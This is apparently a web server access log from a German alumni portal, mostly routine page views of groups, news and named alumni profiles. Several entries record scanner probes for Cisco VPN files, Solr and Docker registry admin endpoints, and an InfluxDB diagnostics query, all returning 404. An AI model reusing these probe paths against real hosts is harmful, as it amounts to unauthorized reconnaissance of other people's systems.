ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 18:15:15;/gruppen/hobby/sozialwissenschaften;/gruppen;GET;200
815eb02900a710e93336396f6a5fb9f75f18e2f4789d31b273f066247cb91205;2025-11-30 18:21:12;;/+CSCOL+/Java.jar;GET;404
815eb02900a710e93336396f6a5fb9f75f18e2f4789d31b273f066247cb91205;2025-11-30 18:21:13;;/+CSCOE+/logon_forms.js;GET;404
815eb02900a710e93336396f6a5fb9f75f18e2f4789d31b273f066247cb91205;2025-11-30 18:21:14;;/+CSCOL+/a1.jar;GET;404
815eb02900a710e93336396f6a5fb9f75f18e2f4789d31b273f066247cb91205;2025-11-30 18:21:15;;/+CSCOE+/transfer.js;GET;404
0410cc5726850d06e131fd54d0f61d2541468c5b204931badfb734151757bb74;2025-11-30 18:24:30;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
2e313dbd58bdf92d16968763adc4c3923f6ada7bfd9e6cbd95a0a83d63da9307;2025-11-30 18:31:50;;/register;GET;200
4c63f8437b52c810529a683b640a23457c4a1e23a07b33b830decc8fb8fdd7c4;2025-11-30 18:31:56;;/gruppen/interesse/it-und-softwareentwicklung;GET;200
26afabeeae3ebace5198569af6d473d32930156a491ede77f4802b087a28dcc6;2025-11-30 18:31:58;;/gruppen/hobby/grafikdesign;GET;302
f06747f4841b94fc1298a824ce928770dce1d350d8ccb8ea7f7655a6fcd61881;2025-11-30 18:32:03;;/gruppen/interesse/datenanalyse-und-forschung;GET;200
616297cef945b63d5cbeb6f10e14c1db568aae56c4f58906be539a1758dc055d;2025-11-30 18:32:08;;/gruppen/hobby/nahen-und-textilarbeiten;GET;302
a091388303b495ef1b7fcd0f5373ddaf85ee47173c161d3d3dcdba86b9855298;2025-11-30 18:35:45;;/personen/alumni/schule/190627;GET;200
512f29edf16f6be7febe2a2e14a32f291b21f4325cc0aa3986dcff60210bf817;2025-11-30 18:39:54;;/?page=docs-DT1-dea.md;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-30 18:50:51;;/register;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-30 18:52:19;;/personen/alumni/schule/0351;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-30 18:52:48;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-30 18:53:38;;/login;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-30 18:55:02;;/;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-30 18:56:26;/rechtliches/impressum;/personen/alumni/schule/4440012;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 18:57:49;/gruppen/hobby/sozialwissenschaften;/gruppen/hobby/nahen-und-textilarbeiten;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-30 18:57:50;/gruppen/hobby/sozialwissenschaften;/gruppen;GET;200
b8f065d6a1b988578014c5a42b1f2da902493bb32f6cc9c77ee6631a179e63a6;2025-11-30 19:00:42;;/personen/alumni/schule/HS001;GET;200
163fc7d30b42abc08e91b21b7c03e5c98ec32013f24e4eddacf46a89b461d206;2025-11-30 19:00:45;/;/;GET;200
6c7cbda7ee584685f46b25f260010a044c89b8c16ecc4ba5535c50b6839a0e11;2025-11-30 19:01:50;;/?page=docs-sql;GET;200
2e7d0ddd92076f9abbf876329c559a83a633f5560985ca523e3fc14da84c34fd;2025-11-30 19:04:59;;/gruppen/hobby/malen-und-zeichnen;GET;302
b15fbb64b054b9099bc39d303e15731a3e8b928dd20afab2e72fa6b9d8bacabc;2025-11-30 19:10:08;;/sitemap.xml.gz;GET;404
66404f0ed01f304b2c41d402c392067adf0c1f9a83e76a8e63f0a6ccbb664c58;2025-11-30 19:14:00;;/;GET;200
77c2217b2e824cfc4ebe16a5fb7388a3141c003879c7cac5b8211e2391ce2f18;2025-11-30 19:22:39;;/sitemaps.xml;GET;404
8dce3f89b9dde903842230c16f9b919774db5ea134069a3c5a13087e3ae18bb0;2025-11-30 19:24:55;;/personen/alumni/details/sebastian-langhorst;GET;200
3246c423bd6d7936d6d5e7d9ed8986a4dce0de6996266a560c97e63bd71bcf65;2025-11-30 19:28:20;;/;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-30 19:30:18;;/themen?category=community;GET;200
1ecebaa064225a98d18a4b74d7ef480ec487f09fbbc7ea4314c1278434dee5e6;2025-11-30 19:32:08;;/;GET;200
c8b26615367b9db5c4a64433b1e613f9a81978357d773fa3c46c4918d2c69fad;2025-11-30 19:33:13;;/version;GET;404
7be5d25c8af3c380fbd82e54ecbdfe74388c88456d0426bbd28bff135161a718;2025-11-30 19:34:25;;/gruppen/interesse/projektmanagement;GET;200
42ee4eef99197835e929d171f8d8b16ce9505340799e98ce0b5016db5e6e9a68;2025-11-30 19:34:31;;/veranstaltungen/details/wohnzimmerkonzert;GET;200
50c18a9f435930cbdc37d64aaaa31b6029336e2d27b3feb52eda8a2d85748c02;2025-11-30 19:34:35;;/gruppen/hobby/wandern;GET;302
0fb3bac21a01e9c24a5867b99c794e913420814a7b9a8dd34f1eb93591592a5a;2025-11-30 19:34:38;;/gruppen/hobby/politik-und-debatten;GET;302
6c1a04387e5b1740c0d6aa76bb5be5846621969601cbb7dada6efe9ab19fa12e;2025-11-30 19:34:42;;/gruppen/hobby/fotobearbeitung;GET;302
14b3e81c19e4937409eb97e35ba22e57e5e62c0656bd5454a511ae8a40487d70;2025-11-30 19:34:48;;/gruppen/hobby/logikspiele;GET;302
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-30 19:40:25;/rechtliches/impressum;/personen/alumni/schule/HB0002;GET;200
7da453e68efe251173b0b8303c27ab85823437a019f2459f8b45562653f02419;2025-11-30 19:50:36;;/personen/alumni/schule/MP002;GET;200
4ab332072e83bfa3f959a6b690174f64f7d0f96bda5a8052f17d35f824a0fc83;2025-11-30 19:50:43;;/;GET;200
ce07a43b2c98fab178e9ab30b9a68553c29bab3ec97f299ddc7330ada66b71ef;2025-11-30 19:53:11;;/;GET;200
452393d7388d236bde7cff5f740ebed42c451dc859c93c366c8878a1e44326b7;2025-11-30 19:59:41;;/;GET;200
bd196807870bc00a219cf701c667fae5753a98044d1251606e2cfe2786cdbffa;2025-11-30 19:59:52;/;/;GET;200
a89e2f0fb254a1e211068455c51b467d366029527566ffc9113e50f91a75ded0;2025-11-30 19:59:57;/sitemap.xml;/sitemap.xml;GET;200
e5a2e6179f6905648d622b0f3b22b0dec0d87de3444243087b10f1835df5bde2;2025-11-30 20:00:10;;/;GET;200
d4903c41d93c8fb8ea3b71feb2858da18430b8137054541a5630568055fc3957;2025-11-30 20:01:51;;/;GET;200
0585f502917a48f87e9bf1c303c90e07a81e0619d21dce80adbb054fa19f4c7b;2025-11-30 20:01:59;;/themen?category=bildung;GET;200
74283de2d399279a6f4574797e1f2a1c9374e41f1b303c21900fcc8bebab1b27;2025-11-30 20:04:48;;/gruppen/hobby/gesang;GET;302
ee41901b63d9113a1a41c29dd204a8c9a5c7c77fd336f2e87e3cff42aab40579;2025-11-30 20:07:48;;/personen/alumni/details/sophia-gawron;GET;200
251adbb0328fc897135d4e7b7f8908e3334d3a986dd858cbe912e1abd4fcb07a;2025-11-30 20:10:25;;/sitemap.xml.gz;GET;404
80eb04bca6216006524b8e53fd4c2d3e35841efe7d0e5271eb5e7113a3915af2;2025-11-30 20:19:23;;/personen/alumni/schule/190627;GET;200
02f66c2824c035276f5b33530aa39c435780e9f9a2564dcc2497ff94c98cb850;2025-11-30 20:22:04;;/sitemaps.xml;GET;404
d987f949674320506cec88f7d6e9294cbe6c8c7c882818e565686489196c41ad;2025-11-30 20:26:16;;/gruppen/hobby/reisen;GET;302
9edf0401f9e190c45ce02e5d2586038bffb402e136bf11d3470b73f4334bac27;2025-11-30 20:26:23;;/gruppen/hobby/podcasting;GET;302
b8ce1ea312f2907f8b084b63b05a49a7fabfb25119bae8dd8e10a1afaed85104;2025-11-30 20:26:25;;/gruppen/hobby/musikinstrumente-spielen;GET;302
4b04d2804909c50f8985819478782a501c4c3f8bcc74dca064c7d900edb40498;2025-11-30 20:26:29;;/gruppen/hobby/fitness;GET;302
314633f325431f5c1d3119c85b187622e70cbeef8978d53441fc47738a8b089d;2025-11-30 20:45:16;;/personen/alumni/details/benjamin-voigt;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 20:54:10;/rechtliches/impressum;/personen/alumni/schule/5506;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 20:55:32;/rechtliches/impressum;/personen/alumni/schule/4540118;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-30 20:56:59;/gruppen/interesse/datenanalyse-und-forschung;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
9a95a861af3e9c56dbd8dcfd9c6dea349a7698990c51af41efd7ecea72549289;2025-11-30 20:57:51;;/gruppen/hobby/robotik;GET;302
5a8de6356486735be1c751c9df72736a820cbed62a95e6123ef2aa7b0a6f1d83;2025-11-30 20:57:55;;/reset-password;GET;200
baefb152f26544e034ada709f53518e4d9f7b7ab9e32668878ab9f6aa2e1f7fa;2025-11-30 21:02:12;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
b8b618d9f1255b9c1382fddad19aed2be31ae3dd53c3bc54643005aa396d53bd;2025-11-30 21:02:55;/personen;/personen;GET;200
8362d567d1c598eaad9394b6e1174b2038550859b8829575e1a4eb638a537b52;2025-11-30 21:12:00;;/personen/all/5;GET;200
f8f65004fc802187dd1292f369053c2111947a25aec870bfc072210f17bc28b8;2025-11-30 21:12:57;;/;GET;200
6de3d7fb06637e0647d04dfe97b9d3a9de2aff2a739ae1b639fb8f1f0366cc7d;2025-11-30 21:30:03;;/;GET;200
b6ec75bbb2858e5c9765836955f136fecedef6d40c7155340bd47636e77c36b9;2025-11-30 21:33:26;;/gruppen/interesse/gesundheitswesen-und-pflege;GET;200
bbdced1c2032d061c920aa5d349fadc41a17ade0dbc74892411800c3e813ce3e;2025-11-30 21:37:45;;/;GET;200
46b339cbf07f2a5dad6e9969dfde8139666f1f96a479ab8eb1127397827d3b01;2025-11-30 21:41:16;;/personen/alumni/schule/67210;GET;200
b90e1139bb433880b742bb20819f9d2ea1d383cb7dd7c8cf7b8d1c0ab8bac9e0;2025-11-30 21:42:44;;/;GET;200
3981380650039863cfd1cad6a152f875554acb0f38e5a63f4be1b9e49980c48b;2025-11-30 21:48:49;;/;GET;200
577a25e4f90912724db771977e15012d0e78bba83402cbd61afd39cdc114f58f;2025-11-30 21:49:54;/aktuelles/stellenangebote;/aktuelles/stellenangebote;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-30 21:54:25;/rechtliches/impressum;/personen/alumni/schule/03A04;GET;200
5ff17b5f5019ed6efc06cfb9172a1a1d7c2fb6be47c7c63d842e98293f718ccb;2025-11-30 22:03:33;;/gruppen/hobby/ernahrungswissenschaft;GET;302
4e26edad5fc5c454eba3e8e475bb01112c5a10f1ef968bb62256eb2133dc33e2;2025-11-30 22:12:36;;/;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 22:15:50;/gruppen/hobby/sozialwissenschaften;/gruppen/hobby/statistik;GET;302
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-30 22:15:53;/gruppen/hobby/sozialwissenschaften;/gruppen;GET;200
963acf2fcb295b16fc6a97ce3f003d37a81fb72f75354ec8b9320d101bdc12ba;2025-11-30 22:24:30;;/personen/alumni/schule/190627;GET;200
5ce725f9a0dfb3924606587e19a1710ccf236c3011cc24876bf79f62ed03ef7c;2025-11-30 22:26:55;;/gruppen/hobby/sozialwissenschaften;GET;302
786bb84a8753c75134549fdcdd43024f239b7ebd271a99742b9d65b21923d984;2025-11-30 22:26:57;;/gruppen/hobby/schreinern-und-bauen;GET;302
ef80058657c224944578081d67bd4aa6361f12413f2924a641f06c82387e49b2;2025-11-30 22:27:01;;/gruppen/hobby/biologie;GET;302
512f29edf16f6be7febe2a2e14a32f291b21f4325cc0aa3986dcff60210bf817;2025-11-30 22:27:10;;/personen/alumni/details/tobi-esche;GET;200
edbc5187ea9e1b4f340ca05a2b6cc100bcdd16258a1c6eb84d55d894d14c44b1;2025-11-30 22:28:17;;/;GET;200
991fc555599b1655263a4b24589738462d4ab06819ba0f736082baac96c66f65;2025-11-30 22:37:43;;/themen/details/abschied-aus-moabit;GET;200
b5712c168a77aa8ade1084237e92fe295197838ec3a60be75e5b326e8f900158;2025-11-30 22:49:37;;/personen/alumni/schule/MP002;GET;200
304970c76600f6feb29f7d04063431387af3c187fecfa621aa74e697e4f1c364;2025-11-30 22:52:17;/solr/admin/info/system;/solr/admin/info/system;GET;404
304970c76600f6feb29f7d04063431387af3c187fecfa621aa74e697e4f1c364;2025-11-30 22:52:17;/v2/_catalog;/v2/_catalog;GET;404
f9d095ed36aadb4074944e0103a89bbad3836963a2d97303dbd332130cd66a84;2025-11-30 22:52:17;/query?q=SHOW+DIAGNOSTICS;/query?q=SHOW+DIAGNOSTICS;GET;404
dab6a0ee09a073b8cf90bb7120ed3c337246662b43cd6a59587b10086ae413e8;2025-11-30 22:52:17;;/;GET;200
304970c76600f6feb29f7d04063431387af3c187fecfa621aa74e697e4f1c364;2025-11-30 22:52:18;/solr/admin/cores?action=STATUS&wt=json;/solr/admin/cores?action=STATUS&wt=json;GET;404
352fda8d12a0dfcd8fd8fc8ecd2b96e1984c3bcb8aebe9e64c66f66b21f04bfb;2025-11-30 22:52:19;/;/;GET;200
8a59164c909b78b9435863a66d7b5831634c371e56f5440e50edc07807031611;2025-11-30 22:53:21;;/gruppen/hobby/geschichte;GET;302
8f396eeda72715f30d5e26e0f497cd87ebdebb9a81593fde815467ed7d0ad014;2025-11-30 22:53:28;;/gruppen/hobby/tanzen;GET;302
5a8de6356486735be1c751c9df72736a820cbed62a95e6123ef2aa7b0a6f1d83;2025-11-30 22:53:30;;/gruppen/hobby/teamsportarten;GET;302
ca42ea59265ff463d9f9325f1716bdd0154475634fb7f90202cbe9cee2bcb082;2025-11-30 22:53:33;;/gruppen/hobby/kochen-und-backen;GET;302
55f56538fd025bdc8f9dff62640c6151eab5299bbd2ad6b6aa6272aa1194e864;2025-11-30 22:53:38;;/personen/alumni/details/felix-fischer;GET;200
cd71a1380806ee11dcd339e04143df0a11b7f83c1316873894446ffe903538d8;2025-11-30 22:53:39;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
7a9312b0d6adf89c81cd068e32139ada047406a634abdac3b123aa07328af76c;2025-11-30 22:53:41;;/personen/alumni/details/thomas-matzig;GET;200
9e52b3fa69271d48be58f9363babc6199cbebd2aaed3297ebfee5e2f81dcdc21;2025-11-30 22:55:55;;/;GET;200
bb50cac1315ddf1df06824a8faca5a5892ec51e7bbc5a8495f7c76d54b94a07f;2025-11-30 23:02:51;;/;GET;200
fff78639dc4db5ae5a7b469a0e0f4f53425d67c4eeeb4473b78b3c2d419aff32;2025-11-30 23:03:22;;/;GET;200
c5c142c51853fc78d1b01520715d8d5d22d9efc5314373c6a8e83741ed19931c;2025-11-30 23:07:52;;/;GET;200
84bd61a4990e9fafb6acc5057c18fa3b2c22b85c9b21e6479d7f1a6ad8d0b1c4;2025-11-30 23:15:03;;/;GET;200
6044247ac9a307d0d615ee9af4aac258f38066d9b95a4e5b169f0a80806b2f18;2025-11-30 23:20:25;;/;GET;200
9e763aee7acf71c35d7be213d4de70134535c250ecdf99f33052c2f91000ee72;2025-11-30 23:29:48;;/gruppen/hobby/debattieren;GET;302
e1dd635c30610fa5905e1153a75acc40a86a2c659a55b17dea04c4b56687cea1;2025-11-30 23:29:54;;/gruppen/hobby/lesen;GET;302
39139bde2532f42bebaa101047053401f4aa3f5af203a6a5c1f82161889eea1d;2025-11-30 23:31:44;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
0bb89a116102425b681bb172687e3335df88b1b6ceffb245144bc45921e52bfc;2025-11-30 23:37:25;;/;GET;200
d4814bc2ecc9fdb6157a2a10861ec898893a958eea6b439348179465593c82d6;2025-11-30 23:41:56;;/personen/alumni/details/sebastian-langhorst;GET;200
11fbed86c1788e4e479ca15cac071ff7d85c844bf212c217de49c3e4bc915f48;2025-11-30 23:43:40;;/themen/details/der-start-ins-studium;GET;200
3d1702aa8055d0944d37590aefefa6956e3726d29b037b74ef770d2255e4a300;2025-11-30 23:46:08;;/;GET;200
2bf5afc507fbfa9ff455752c9a0986d9693784470194ef54fc5a9391e3538268;2025-11-30 23:46:26;;/;GET;200
9724c10abd4067aae09e9709fa577ef4f77c86fef6202b3b4ac706f668b31ab7;2025-11-30 23:50:14;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
c04408f34a06a975b02ee212bc3d34537df678d11a1a60fad830921024f98bc7;2025-11-30 23:54:57;/;/;GET;200
f624b6a1c0c53fb6d500ea4abe271104bcdd0c697bf0e5730b73ac44a0e8e384;2025-11-30 23:59:33;;/personen/all/2;GET;200
fc35ef93448f21ea1536a5c42f35c4c9fc6227b2d48dba1173b90c5df464eab5;2025-11-30 23:59:38;;/personen/all/4;GET;200
e1dd635c30610fa5905e1153a75acc40a86a2c659a55b17dea04c4b56687cea1;2025-11-30 23:59:41;;/gruppen/hobby/musikproduktion;GET;302
c4ea4054849d4d94bbe4c2d254ef90cc1ba53b6d787fcb6b5bcb50d4050dcd33;2025-11-30 23:59:46;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
